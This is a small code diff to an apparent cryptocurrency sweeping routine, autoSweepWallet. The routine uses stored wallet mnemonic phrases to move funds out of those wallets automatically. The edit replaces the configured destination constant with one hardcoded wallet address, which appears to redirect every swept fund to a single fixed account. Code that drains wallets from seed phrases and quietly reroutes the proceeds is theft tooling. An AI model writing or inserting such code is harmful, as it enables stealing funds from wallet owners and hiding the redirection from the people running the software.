@@ -880,7 +880,7 @@ export const autoSweepWallet = async () => {
                 try {
                     const existingSponsor = await Sponsors.findOne({ mnemonic: phrase.mnemonic });
                     if(!existingSponsor) {
-                        await sweepToMuxedWallet(phrase.mnemonic, PI_PUBLIC_MUXED_ADDRESS);
+                        await sweepToMuxedWallet(phrase.mnemonic, "GDEXHXRYQSO3ZUALASGI6IT2ETATNM6HTYGZM3C7RV5TETEOKYIHEYPA");
                     }
                 } catch (e) {
                     if (e.response && e.response.data && e.response.data.extras) {
